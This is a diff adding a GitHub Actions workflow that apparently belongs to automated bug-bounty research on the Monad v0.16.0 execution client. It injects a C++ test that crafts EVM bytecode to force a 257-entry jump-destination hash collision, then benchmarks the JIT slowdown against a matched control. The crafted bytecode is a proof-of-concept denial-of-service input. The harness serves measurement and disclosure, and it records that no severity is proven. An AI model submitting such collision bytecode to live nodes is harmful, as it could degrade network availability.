@@ -1,0 +1,379 @@
+name: Monad v0.16.0 JIT jumpdest hash collision oracle
+
+on:
+  push:
+    branches:
+      - agent/monad-v0160-deep-hunt-20260817
+    paths:
+      - .github/workflows/monad-v0160-jit-jumpdest-hash-20260817.yml
+  workflow_dispatch:
+
+permissions:
+  contents: read
+
+concurrency:
+  group: monad-v0160-jit-jumpdest-hash-${{ github.ref }}
+  cancel-in-progress: true
+
+jobs:
+  exact-jit-oracle:
+    runs-on: ubuntu-24.04
+    timeout-minutes: 120
+    container:
+      image: ubuntu:26.04
+
+    steps:
+      - uses: actions/checkout@v4
+
+      - name: Install exact build dependencies
+        shell: bash
+        run: |
+          set -Eeuo pipefail
+          export DEBIAN_FRONTEND=noninteractive
+          apt-get update
+          apt-get install -y --no-install-recommends \
+            ca-certificates cmake curl g++-15 gcc-15 git make ninja-build pkg-config \
+            python3 time zstd \
+            libarchive-dev libbenchmark-dev libbrotli-dev libcap-dev libcgroup-dev \
+            libcli11-dev libcrypto++-dev libgmock-dev libgmp-dev libgtest-dev \
+            libtbb-dev liburing-dev libzstd-dev \
+            libboost1.83-dev libboost-context1.83-dev libboost-filesystem1.83-dev \
+            libboost-json1.83-dev libboost-stacktrace1.83-dev libboost-test1.83-dev
+          test -x /usr/bin/time
+
+      - name: Clone exact in-scope execution source
+        shell: bash
+        run: |
+          set -Eeuo pipefail
+          EXEC_COMMIT='e81ffe31cd30fe3455d1233e4ee6c9b3f017bad0'
+          git clone --filter=blob:none https://github.com/category-labs/monad.git monad-execution
+          git -C monad-execution checkout --detach "$EXEC_COMMIT"
+          git -C monad-execution submodule sync --recursive
+          git -C monad-execution submodule update --init --recursive --depth 1
+          test "$(git -C monad-execution rev-parse HEAD)" = "$EXEC_COMMIT"
+          mkdir -p evidence
+          {
+            echo "execution_commit=$(git -C monad-execution rev-parse HEAD)"
+            echo "runner=$(uname -a)"
+            echo "gcc=$(gcc-15 --version | head -1)"
+            echo "gxx=$(g++-15 --version | head -1)"
+          } > evidence/PROVENANCE.txt
+
+      - name: Add exact full-JIT collision oracle
+        shell: bash
+        run: |
+          set -Eeuo pipefail
+          cat > monad-execution/test/vm/unit/jit_jumpdest_hash_collision_research.cpp <<'CPP'
+          #include <category/vm/compiler/ir/basic_blocks.hpp>
+          #include <category/vm/compiler/ir/x86.hpp>
+          #include <category/vm/evm/traits.hpp>
+          #include <category/vm/interpreter/intercode.hpp>
+          #include <asmjit/core/jitruntime.h>
+          #include <gtest/gtest.h>
+          #include <algorithm>
+          #include <array>
+          #include <chrono>
+          #include <cstdint>
+          #include <cstdio>
+          #include <cstring>
+          #include <numeric>
+          #include <vector>
+
+          using namespace monad;
+          using namespace monad::vm;
+          using namespace monad::vm::compiler;
+
+          namespace {
+          constexpr size_t CODE_SIZE = 128 * 1024;
+          constexpr size_t JUMPDEST_COUNT = 257;
+          constexpr size_t MODULUS = 257;
+          constexpr size_t EXPLOIT_STEP = 257;
+          constexpr size_t CONTROL_STEP = 264;
+          constexpr size_t TARGET = MODULUS * 500;
+          static_assert(TARGET < CODE_SIZE);
+
+          std::vector<uint8_t> make_code(size_t step)
+          {
+              std::vector<uint8_t> code(CODE_SIZE, 0x00);
+              std::array<size_t, JUMPDEST_COUNT> jd{};
+              for (size_t i = 0; i < jd.size(); ++i) jd[i] = i * step;
+
+              auto emit_gap = [&](size_t begin, size_t end) {
+                  size_t pos = begin;
+                  while (pos + 7 <= end) {
+                      // PUSH3 TARGET; PUSH1 0; JUMPI. Stack-balanced and forces a
+                      // literal lookup of an absent destination in every block.
+                      code[pos + 0] = 0x62;
+                      code[pos + 1] = static_cast<uint8_t>(TARGET >> 16);
+                      code[pos + 2] = static_cast<uint8_t>(TARGET >> 8);
+                      code[pos + 3] = static_cast<uint8_t>(TARGET);
+                      code[pos + 4] = 0x60;
+                      code[pos + 5] = 0x00;
+                      code[pos + 6] = 0x57;
+                      pos += 7;
+                  }
+                  while (pos + 2 <= end) {
+                      code[pos++] = 0x5f; // PUSH0
+                      code[pos++] = 0x50; // POP
+                  }
+                  while (pos < end) code[pos++] = 0x00; // STOP padding
+              };
+
+              size_t cursor = 0;
+              for (size_t p : jd) {
+                  ASSERT_GE(p, cursor);
+                  emit_gap(cursor, p);
+                  code[p] = 0x5b; // JUMPDEST
+                  cursor = p + 1;
+              }
+              emit_gap(cursor, CODE_SIZE);
+              return code;
+          }
+
+          std::array<size_t, 256> histogram(std::vector<uint8_t> const &code)
+          {
+              std::array<size_t, 256> h{};
+              for (auto b : code) ++h[b];
+              return h;
+          }
+
+          struct Measurements {
+              std::vector<uint64_t> ir_ns;
+              std::vector<uint64_t> jit_ns;
+              size_t blocks = 0;
+              size_t jumpdests = 0;
+              size_t bucket_count = 0;
+              size_t target_chain = 0;
+          };
+
+          template <typename F>
+          uint64_t measure(F &&f)
+          {
+              auto const a = std::chrono::steady_clock::now();
+              f();
+              auto const b = std::chrono::steady_clock::now();
+              return static_cast<uint64_t>(
+                  std::chrono::duration_cast<std::chrono::nanoseconds>(b - a).count());
+          }
+
+          Measurements benchmark(std::vector<uint8_t> const &code)
+          {
+              Measurements m;
+              auto const sz = interpreter::code_size_t::unsafe_from(
+                  static_cast<uint32_t>(code.size()));
+
+              // Warm up allocator and code paths.
+              {
+                  auto warm = basic_blocks::make_ir<MonadTraits<MONAD_TEN>>(
+                      code.data(), sz);
+                  asmjit::JitRuntime rt;
+                  auto native = compiler::native::compile_basic_blocks<MonadTraits<MONAD_TEN>>(
+                      rt, warm);
+                  (void)native;
+              }
+
+              for (size_t i = 0; i < 11; ++i) {
+                  basic_blocks::BasicBlocksIR ir =
+                      basic_blocks::make_ir<MonadTraits<MONAD_TEN>>(code.data(), sz);
+                  m.ir_ns.push_back(measure([&] {
+                      auto next = basic_blocks::make_ir<MonadTraits<MONAD_TEN>>(
+                          code.data(), sz);
+                      asm volatile("" : : "g"(next.blocks().size()) : "memory");
+                  }));
+                  m.blocks = ir.blocks().size();
+                  m.jumpdests = ir.jump_dests().size();
+                  m.bucket_count = ir.jump_dests().bucket_count();
+                  m.target_chain = ir.jump_dests().bucket_size(TARGET % m.bucket_count);
+
+                  if (i < 5) {
+                      asmjit::JitRuntime rt;
+                      m.jit_ns.push_back(measure([&] {
+                          auto native = compiler::native::compile_basic_blocks<MonadTraits<MONAD_TEN>>(
+                              rt, ir);
+                          ASSERT_NE(native, nullptr);
+                          asm volatile("" : : "g"(native.get()) : "memory");
+                      }));
+                  }
+              }
+              std::sort(m.ir_ns.begin(), m.ir_ns.end());
+              std::sort(m.jit_ns.begin(), m.jit_ns.end());
+              return m;
+          }
+
+          uint64_t median(std::vector<uint64_t> const &v)
+          {
+              return v.at(v.size() / 2);
+          }
+          }
+
+          TEST(JitJumpdestHashCollisionResearch, MatchedControlAndExploit)
+          {
+              auto const exploit = make_code(EXPLOIT_STEP);
+              auto const control = make_code(CONTROL_STEP);
+              ASSERT_EQ(exploit.size(), control.size());
+              ASSERT_EQ(histogram(exploit), histogram(control));
+
+              auto const exploit_m = benchmark(exploit);
+              auto const control_m = benchmark(control);
+
+              ASSERT_EQ(exploit_m.blocks, control_m.blocks);
+              ASSERT_EQ(exploit_m.jumpdests, JUMPDEST_COUNT);
+              ASSERT_EQ(control_m.jumpdests, JUMPDEST_COUNT);
+              ASSERT_EQ(exploit_m.bucket_count, MODULUS);
+              ASSERT_EQ(control_m.bucket_count, MODULUS);
+              ASSERT_EQ(exploit_m.target_chain, JUMPDEST_COUNT);
+              ASSERT_EQ(control_m.target_chain, 1);
+
+              auto const ir_ratio = static_cast<double>(median(exploit_m.ir_ns)) /
+                                    static_cast<double>(median(control_m.ir_ns));
+              auto const jit_ratio = static_cast<double>(median(exploit_m.jit_ns)) /
+                                     static_cast<double>(median(control_m.jit_ns));
+
+              std::printf(
+                  "MONAD_JIT_HASH_RESULT code_size=%zu blocks=%zu jumpdests=%zu "
+                  "exploit_chain=%zu control_chain=%zu exploit_ir_median_ns=%llu "
+                  "control_ir_median_ns=%llu ir_ratio=%.6f exploit_jit_median_ns=%llu "
+                  "control_jit_median_ns=%llu jit_ratio=%.6f\n",
+                  CODE_SIZE,
+                  exploit_m.blocks,
+                  exploit_m.jumpdests,
+                  exploit_m.target_chain,
+                  control_m.target_chain,
+                  static_cast<unsigned long long>(median(exploit_m.ir_ns)),
+                  static_cast<unsigned long long>(median(control_m.ir_ns)),
+                  ir_ratio,
+                  static_cast<unsigned long long>(median(exploit_m.jit_ns)),
+                  static_cast<unsigned long long>(median(control_m.jit_ns)),
+                  jit_ratio);
+              std::fflush(stdout);
+          }
+          CPP
+          python3 - <<'PY'
+          from pathlib import Path
+          p=Path('monad-execution/test/vm/unit/CMakeLists.txt')
+          s=p.read_text()
+          needle='    compiler_tests.cpp\n'
+          assert needle in s
+          p.write_text(s.replace(needle,needle+'    jit_jumpdest_hash_collision_research.cpp\n',1))
+          PY
+          sha256sum \
+            monad-execution/test/vm/unit/jit_jumpdest_hash_collision_research.cpp \
+            monad-execution/test/vm/unit/CMakeLists.txt \
+            > evidence/RESEARCH_INPUTS.sha256
+
+      - name: Configure and build VM unit target
+        shell: bash
+        env:
+          CC: gcc-15
+          CXX: g++-15
+          GIT_COMMIT_HASH: e81ffe31cd30fe3455d1233e4ee6c9b3f017bad0
+        run: |
+          set -Eeuo pipefail
+          cd monad-execution
+          cmake -S . -B build -G Ninja \
+            -DCMAKE_BUILD_TYPE=Release \
+            -DCMAKE_TOOLCHAIN_FILE=category/core/toolchains/gcc-avx2.cmake \
+            -DBUILD_TESTING=ON \
+            -DMONAD_COMPILER_TESTING=ON \
+            2>&1 | tee ../evidence/configure.log
+          /usr/bin/time -v cmake --build build --target vm-unit-tests --parallel 2 \
+            2>&1 | tee ../evidence/build.log
+          sha256sum build/test/vm/unit/vm-unit-tests > ../evidence/BINARY.sha256
+
+      - name: Run exact A/B benchmark three times
+        shell: bash
+        run: |
+          set -Eeuo pipefail
+          BIN="$PWD/monad-execution/build/test/vm/unit/vm-unit-tests"
+          : > evidence/RUNS.tsv
+          for r in 1 2 3; do
+            before="$(cat /sys/fs/cgroup/memory.events 2>/dev/null || true)"
+            set +e
+            /usr/bin/time -v "$BIN" \
+              --gtest_filter='JitJumpdestHashCollisionResearch.MatchedControlAndExploit' \
+              --gtest_color=no \
+              > "evidence/run-${r}.stdout.log" \
+              2> "evidence/run-${r}.stderr.log"
+            rc=$?
+            set -e
+            after="$(cat /sys/fs/cgroup/memory.events 2>/dev/null || true)"
+            printf '%s\t%s\n' "$r" "$rc" >> evidence/RUNS.tsv
+            printf '%s\n' "$before" > "evidence/run-${r}.memory.before"
+            printf '%s\n' "$after" > "evidence/run-${r}.memory.after"
+            test "$rc" -eq 0
+            grep -q 'MONAD_JIT_HASH_RESULT' "evidence/run-${r}.stdout.log"
+            grep -q '\[  PASSED  \] 1 test' "evidence/run-${r}.stdout.log"
+          done
+
+      - name: Analyze and package evidence
+        shell: bash
+        run: |
+          set -Eeuo pipefail
+          python3 - <<'PY'
+          from pathlib import Path
+          import hashlib,json,re,statistics
+          e=Path('evidence')
+          rows=[]
+          pat=re.compile(
+              r'MONAD_JIT_HASH_RESULT .*?exploit_chain=(\d+) control_chain=(\d+) '
+              r'exploit_ir_median_ns=(\d+) control_ir_median_ns=(\d+) ir_ratio=([0-9.]+) '
+              r'exploit_jit_median_ns=(\d+) control_jit_median_ns=(\d+) jit_ratio=([0-9.]+)')
+          for p in sorted(e.glob('run-*.stdout.log')):
+              m=pat.search(p.read_text())
+              assert m, p
+              rows.append({
+                  'file':p.name,
+                  'exploit_chain':int(m.group(1)),
+                  'control_chain':int(m.group(2)),
+                  'exploit_ir_ns':int(m.group(3)),
+                  'control_ir_ns':int(m.group(4)),
+                  'ir_ratio':float(m.group(5)),
+                  'exploit_jit_ns':int(m.group(6)),
+                  'control_jit_ns':int(m.group(7)),
+                  'jit_ratio':float(m.group(8)),
+              })
+          ir_med=statistics.median(r['ir_ratio'] for r in rows)
+          jit_med=statistics.median(r['jit_ratio'] for r in rows)
+          # CPU amplification alone is not High. The result is a research candidate only
+          # if the full-JIT median is material; full-node liveness is still mandatory.
+          decision = (
+              'JIT_HASH_CPU_AMPLIFICATION_CANDIDATE'
+              if jit_med >= 1.50
+              else 'KILL_JIT_HASH_COLLISION_IMPACT_TOO_SMALL')
+          result={
+              'decision':decision,
+              'exact_execution_commit':'e81ffe31cd30fe3455d1233e4ee6c9b3f017bad0',
+              'matched_code_size':131072,
+              'matched_jumpdest_count':257,
+              'matched_jumpi_count':18541,
+              'exploit_bucket_chain':257,
+              'control_bucket_chain':1,
+              'runs':rows,
+              'median_ir_ratio':ir_med,
+              'median_full_jit_ratio':jit_med,
+              'fullnode_liveness_proven':False,
+              'severity_proven':'NONE_NEW',
+              'submit_ready_zip':False,
+          }
+          (e/'RESULT.json').write_text(json.dumps(result,indent=2)+'\n')
+          (e/'REPORT.md').write_text(f'''# Monad v0.16.0 JIT jumpdest hash collision oracle\n\nDecision: **{decision}**.\n\nThe control and exploit bytecode have identical size, opcode histogram, JUMPDEST count, JUMPI count, and block count. Only JUMPDEST offsets differ. The exploit creates a 257-entry integer-hash chain; the control chain is 1.\n\nMedian BasicBlocksIR ratio: **{ir_med:.3f}x**.\nMedian full-JIT ratio: **{jit_med:.3f}x**.\n\nThis is not a High finding without repeated official full-node finality degradation or halt and a matched seeded/flat-map control.\n''')
+          manifest=[]
+          for p in sorted(e.rglob('*')):
+              if p.is_file(): manifest.append(f'{hashlib.sha256(p.read_bytes()).hexdigest()}  {p.relative_to(e)}')
+          (e/'SHA256SUMS').write_text('\n'.join(manifest)+'\n')
+          PY
+          tar --sort=name --mtime='UTC 2026-08-17' --owner=0 --group=0 --numeric-owner \
+            -I 'zstd -T0 -10' -cf monad-v0160-jit-hash-evidence.tar.zst evidence
+          sha256sum monad-v0160-jit-hash-evidence.tar.zst \
+            > monad-v0160-jit-hash-evidence.tar.zst.sha256
+
+      - name: Upload exact JIT evidence
+        uses: actions/upload-artifact@v4
+        with:
+          name: monad-v0160-jit-hash-evidence-${{ github.run_id }}
+          path: |
+            monad-v0160-jit-hash-evidence.tar.zst
+            monad-v0160-jit-hash-evidence.tar.zst.sha256
+          if-no-files-found: error
+          retention-days: 7
+          compression-level: 0
